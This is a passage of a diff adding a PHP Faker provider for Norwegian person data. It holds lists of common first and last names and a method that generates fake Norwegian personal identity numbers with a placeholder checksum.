+        "Hossein", "Houssein", "Hroar", "Hubert", "Hugo", "Hung", "Hussain", "Hussein", "Huu", "Huy", "Hågen", "Håkon",
+        "Haakon", "Hårek", "Håvald", "Håvar", "Håvard", "Haavard", "Ian", "Iben", "Ibrahim", "Idar", "Idris", "Igor",
+        "Ilir", "Ilyas", "Iman", "Imbert", "Immanuel", "Imre", "Ingar", "Ingard", "Inge", "Ingebret", "Ingebrigt",
+        "Ingemar", "Ingemund", "Ingmar", "Ingnar", "Ingolf", "Ingolv", "Ingvald", "Ingvar", "Ingvard", "Ingve",
+        "Ioannis", "Iqra", "Irfan", "Isa", "Isach", "Isak", "Ismail", "Ismet", "Istvan", "Ivan", "Ivar", "Iver", "Jack",
+        "Jacob", "Jahn", "Jakob", "Jalal", "Jamal", "James", "Jan", "Jani", "Jannik", "Jarand", "Jardar", "Jarl",
+        "Jarle", "Jason", "Jasper", "Jean", "Jeffrey", "Jens", "Jeppe", "Jeremias", "Jermund", "Jerry", "Jerzy",
+        "Jesper", "Jesus", "Jetmund", "Jim", "Jimmy", "Jiri", "Jo", "Joachim", "Joakim", "Joar", "Joe", "Joel",
+        "Jogeir", "Johan", "Johannes", "John", "Johnny", "Jokum", "Jomar", "Jon", "Jonas", "Jonatan", "Jonathan",
+        "Jone", "Jonny", "Joralf", "Jorge", "Jorulf", "Josef", "Joshua", "Jostein", "Josva", "Juan", "Juel", "Jul",
+        "Julian", "Julius", "Just", "Jürgen", "Jøran", "Jørg", "Jørgen", "Jørn", "Jørund", "Kadir", "Kai", "Kalle",
+        "Kamal", "Kamran", "Karel", "Karelius", "Karim", "Karl", "Karlo", "Karstein", "Karsten", "Kasim", "Kaspar",
+        "Kasper", "Kato", "Kay", "Kazimierz", "Keith", "Kemal", "Ken", "Kennet", "Kenneth", "Kent", "Ketil", "Kevin",
+        "Khalid", "Khalil", "Kian", "Kim", "Kimberly", "Kittil", "Kjartan", "Kjell", "Kjerand", "Kjetil", "Kjølv",
+        "Klas", "Klaus", "Klemet", "Kleng", "Knut", "Kolbein", "Kolbjørn", "Kolfinn", "Konrad", "Konstantin",
+        "Kornelius", "Kris", "Kristen", "Krister", "Kristian", "Kristofer", "Kristoffer", "Ksenia", "Kurt", "Kyrre",
+        "Kåre", "Lage", "Lambert", "Lars", "Lasse", "Laurent", "Laurentius", "Lauri", "Laurits", "Lauritz", "Lavrans",
+        "Leander", "Lech", "Leidulf", "Leidulv", "Leif", "Leik", "Leiv", "Lennart", "Leo", "Leon", "Leonard",
+        "Leonhard", "Leopold", "Levi", "Levord", "Lewis", "Liam", "Liban", "Lidvar", "Linus", "Livar", "Lloyd",
+        "Lodvar", "Lodve", "Loke", "Lorents", "Lorentz", "Lothar", "Louis", "Lucas", "Ludolf", "Ludvig", "Ludvik",
+        "Lukas", "Lyder", "Maciej", "Mads", "Magnar", "Magne", "Magnus", "Mahad", "Mahamed", "Majid", "Malcolm",
+        "Malfred", "Malte", "Malthe", "Malvin", "Manfred", "Manuel", "Marc", "Marcel", "Marco", "Marcus", "Marenius",
+        "Margido", "Marius", "Mark", "Markus", "Martin", "Martinius", "Martinus", "Marvin", "Mathias", "Matias",
+        "Mats", "Matteus", "Mattias", "Mattis", "Maurice", "Maurits", "Mauritz", "Max", "Maximilian", "Mehmet",
+        "Melkior", "Melvin", "Michael", "Michel", "Mikael", "Mikkel", "Mikkjel", "Milan", "Milo", "Mindor", "Minh",
+        "Miroslaw", "Mirsad", "Mirza", "Moa", "Modolv", "Modulf", "Mogens", "Mohammad", "Mohamoud", "Mons", "Morgan",
+        "Morits", "Moritz", "Morris", "Morten", "Mostafa", "Muhamed", "Muhammad", "Muhammed", "Murat", "Mustafa",
+        "Narve", "Nasir", "Nathaniel", "Neil", "Neri", "Ngoc", "Nicholas", "Niclas", "Nicolai", "Nicolas", "Niels",
+        "Nikolai", "Nikolas", "Nikolaus", "Nils", "Njål", "Noa", "Noah", "Noman", "Noralf", "Norbert", "Nordahl",
+        "Norma", "Norman", "Normann", "Norodd", "Norvald", "Notto", "Nup", "Odd", "Oddbjørn", "Oddgeir", "Oddleif",
+        "Oddmund", "Oddvar", "Oddvin", "Odin", "Ola", "Olaf", "Olai", "Olav", "Ole", "Oleg", "Oliver", "Oluf", "Olve",
+        "Omar", "Ommund", "Oscar", "Oskar", "Osman", "Osmund", "Osvald", "Ottar", "Otto", "Ove", "Pablo", "Palle",
+        "Palmer", "Patrick", "Patrik", "Paul", "Paulus", "Peder", "Pelle", "Per", "Perry", "Peter", "Petrus", "Petter",
+        "Philip", "Piotr", "Poul", "Povel", "Preben", "Paal", "Pål", "Quoc", "Rachid", "Radoslaw", "Rafael", "Ragnar",
+        "Ragnvald", "Raimond", "Rainer", "Ralf", "Ralph", "Randolf", "Randulf", "Rashid", "Rasmus", "Ravn", "Raymond",
+        "Rayner", "Reidar", "Reidulf", "Reidulv", "Reier", "Reimar", "Rein", "Reinert", "Reinhard", "Reinhold",
+        "Reiulf", "Remi", "Remy", "René", "Reza", "Richard", "Rikard", "Rino", "Roald", "Roar", "Robert", "Robin",
+        "Rodney", "Roger", "Roland", "Rolf", "Rolv", "Roman", "Romund", "Ronald", "Ronnie", "Ronny", "Roy", "Ruben",
+        "Rudi", "Rudolf", "Runar", "Rune", "Ryan", "Rådmund", "Sabah", "Said", "Sainab", "Sakarias", "Salah", "Salam",
+        "Salmund", "Salomon", "Salve", "Sam", "Samir", "Samson", "Samuel", "Sander", "Scott", "Sean", "Sebastian",
+        "Sebjørn", "Selmar", "Selmer", "Sergio", "Serkan", "Seveld", "Severin", "Sevrin", "Shahid", "Sigbjørn",
+        "Sigfred", "Sigmund", "Sigurd", "Sigvald", "Sigvard", "Sigvart", "Sigve", "Silias", "Simen", "Simon", "Sindre",
+        "Sivert", "Sjur", "Skage", "Skjalg", "Skjold", "Skule", "Slawomir", "Snorre", "Sofus", "Sondre", "Stanislaw",
+        "Stanley", "Stefan", "Steffen", "Stein", "Steinar", "Steinbjørn", "Steingrim", "Steinkjell", "Steinulv", "Sten",
+        "Stephan", "Steve", "Steven", "Stian", "Stig", "Storm", "Sture", "Sturla", "Sturle", "Styrk", "Stål", "Ståle",
+        "Sune", "Svale", "Svein", "Sveinar", "Sveinulf", "Sveinung", "Sven", "Svend", "Sverre", "Syed", "Sylfest",
+        "Sylvester", "Synne", "Syver", "Syvert", "Sæbjørn", "Sølve", "Søren", "Saad", "Såmund", "Tadeusz", "Tage",
+        "Tahir", "Tallak", "Talleiv", "Tan", "Tarald", "Tariq", "Tarje", "Tarjei", "Ted", "Tedd", "Teddy", "Teis",
+        "Tellef", "Tengel", "Teo", "Teodor", "Terje", "Terjei", "Terkel", "Thai", "Thanh", "Theis", "Theo", "Theodor",
+        "Thien", "Thom", "Thomas", "Thor", "Thoralf", "Thorbjørn", "Thord", "Thore", "Thorkild", "Thorleif", "Thormod",
+        "Thorolf", "Thorstein", "Thorvald", "Tidemann", "Tim", "Timothy", "Tinius", "Tinus", "Tjerand", "Tobben",
+        "Tobias", "Toivo", "Tollak", "Tollef", "Tolleif", "Tolleiv", "Tom", "Tomas", "Tommy", "Tony", "Tor", "Toralf",
+        "Torben", "Torbjørn", "Tord", "Tore", "Torfinn", "Torgard", "Torgeir", "Torger", "Torgil", "Torgils", "Torgny",
+        "Torgrim", "Torje", "Torjus", "Torkel", "Torkil", "Torkild", "Torkjel", "Torleif", "Torleik", "Tormod",
+        "Tormund", "Torodd", "Torolf", "Torolv", "Torry", "Torstein", "Torsten", "Torvald", "Tov", "Trang", "Tristan",
+        "Tron", "Trond", "Troy", "Truls", "Trygg", "Trygve", "Trym", "Tuan", "Ture", "Tønnes", "Tørres", "Ulf", "Ulrik",
+        "Ulv", "Ulvar", "Ulvgeir", "Umar", "Une", "Uno", "Usman", "Vagn", "Valborg", "Valdemar", "Valentin", "Valter",
+        "Vebjørn", "Vegar", "Vegard", "Vegeir", "Vemund", "Verner", "Vetle", "Victor", "Vidar", "Vidkunn", "Viet",
+        "Vigbjørn", "Viggo", "Vigleik", "Vigulv", "Viking", "Viktor", "Vilfred", "Vilgot", "Vilhelm", "Viljar",
+        "Villads", "Villum", "Villy", "Vincent", "Vinjar", "Vladimir", "Vladislav", "Vrål", "Waldemar", "Waleed",
+        "Walid", "Walter", "Wayne", "Werner", "Wictor", "Widar", "Wieslaw", "Wiggo", "Wiktor", "Wilfred", "Wilhelm",
+        "William", "Willy", "Wilmar", "Wojciech", "Wolfgang", "Wollert", "Yasin", "Yasir", "Yngvar", "Yngve", "Yonas",
+        "Younes", "Yousef", "Yousuf", "Yrjan", "Zahid", "Zakaria", "Zbigniew", "Zdzislaw", "Zoran", "Zygmunt",
+        "Øistein", "Øivind", "Ørjan", "Ørjar", "Ørn", "Ørnulf", "Ørnulv", "Ørvar", "Østen", "Øyolv", "Øystein",
+        "Øyvind", "Ådne", "Aage", "Åge", "Aake", "Åke", "Åmund", "Åne", "Ånen", "Ånon", "Ånund", "Aaron", "Åskjell",
+        "Åsleif", "Åsleik", "Åsleiv", "Åsmund", "Aasmund", "Åsulv", "Åsvald", "Åvar"
+    );
+
+    /**
+    * @var array Norwegian common last names (200 first from the link)
+    * @link http://www.ssb.no/befolkning/statistikker/navn/aar/2015-01-27?fane=tabell&sort=nummer&tabell=216066
+    */
+    protected static $lastName = array(
+        "Aas", "Aase", "Aasen", "Abrahamsen", "Ahmed", "Ali", "Amundsen", "Andersen", "Andersson", "Andreassen",
+        "Andresen", "Antonsen", "Arnesen", "Aune", "Bakke", "Bakken", "Berg", "Berge", "Berger", "Berntsen",
+        "Birkeland", "Bjerke", "Bjørnstad", "Borge", "Borgen", "Breivik", "Brekke", "Bråten", "Bråthen", "Bye", "Bø",
+        "Bøe", "Carlsen", "Christensen", "Christiansen", "Dahl", "Dahle", "Dale", "Dalen", "Danielsen", "Edvardsen",
+        "Egeland", "Eide", "Eikeland", "Eilertsen", "Eliassen", "Ellingsen", "Engebretsen", "Engen", "Enger", "Eriksen",
+        "Evensen", "Fjeld", "Foss", "Fosse", "Fossum", "Fredriksen", "Gabrielsen", "Gjerde", "Gulbrandsen", "Gundersen",
+        "Gustavsen", "Haaland", "Haga", "Hagen", "Halvorsen", "Hammer", "Hamre", "Hansen", "Hanssen", "Hassan", "Haug",
+        "Hauge", "Haugen", "Haugland", "Helgesen", "Helland", "Helle", "Henriksen", "Hermansen", "Hoel", "Hoff",
+        "Holen", "Holm", "Holmen", "Hovland", "Håland", "Ingebrigtsen", "Isaksen", "Iversen", "Jacobsen", "Jakobsen",
+        "Jansen", "Jensen", "Jenssen", "Johannesen", "Johannessen", "Johansen", "Johansson", "Johnsen", "Jonassen",
+        "Jørgensen", "Karlsen", "Khan", "Knudsen", "Knutsen", "Kolstad", "Kristensen", "Kristiansen", "Kristoffersen",
+        "Kvam", "Kvamme", "Langeland", "Larsen", "Lie", "Lien", "Lorentzen", "Ludvigsen", "Lund", "Lunde", "Løken",
+        "Madsen", "Magnussen", "Martinsen", "Mathisen", "Mikalsen", "Mikkelsen", "Moe", "Moen", "Mohamed", "Monsen",
+        "Mortensen", "Myhre", "Myklebust", "Møller", "Nguyen", "Nielsen", "Nikolaisen", "Nilsen", "Nilssen", "Nordby",
+        "Nygaard", "Nygård", "Næss", "Olsen", "Ottesen", "Paulsen", "Pedersen", "Petersen", "Pettersen", "Rasmussen",
+        "Ruud", "Rønning", "Rønningen", "Samuelsen", "Sand", "Sandberg", "Sande", "Sandnes", "Sandvik", "Simonsen",
+        "Sivertsen", "Sletten", "Solbakken", "Solberg", "Solheim", "Solli", "Solvang", "Steen", "Stene", "Stokke",
+        "Strand", "Strøm", "Sunde", "Sveen", "Svendsen", "Syversen", "Sæther", "Sætre", "Sørensen", "Sørlie", "Tangen",
+        "Teigen", "Thomassen", "Thoresen", "Thorsen", "Tollefsen", "Torgersen", "Torp", "Tran", "Tveit", "Vik", "Viken",
+        "Wang", "Wiik", "Wilhelmsen", "Wold", "Ødegaard", "Ødegård", "Øien"
+    );
+
+    /**
+    * National Personal Identity number (personnummer)
+    * @link https://no.wikipedia.org/wiki/Personnummer
+    * @param \DateTime $birthdate
+    * @param string $gender Person::GENDER_MALE || Person::GENDER_FEMALE
+    * @return string on format DDMMYY#####
+    */
+    public function personalIdentityNumber(\DateTime $birthdate = null, $gender = null)
+    {
+        if (!$birthdate) {
+            $birthdate = \Faker\Provider\DateTime::dateTimeThisCentury();
+        }
+        $datePart = $birthdate->format('dmy');
+
+        /**
+        * @todo These number should be random based on birth year
+        * @link http://no.wikipedia.org/wiki/F%C3%B8dselsnummer
+        */
+        $randomDigits = (string)static::numerify('##');
+
+        switch ($gender) {
+            case static::GENDER_MALE:
+                $genderDigit = static::randomElement(array(1,3,5,7,9));
+                break;
+            case static::GENDER_FEMALE:
+                $genderDigit = static::randomElement(array(0,2,4,6,8));
+                break;
+            default:
+                $genderDigit = (string)static::numerify('#');
+        }
+
+
+        $digits = $datePart.$randomDigits.$genderDigit;
+
+        /**
+        * @todo Calculate modulo 11 of $digits
+        * @link http://no.wikipedia.org/wiki/F%C3%B8dselsnummer
+        */
+        $checksum = (string)static::numerify('##');
+
+
+        return $digits.$checksum;
+    }
+}
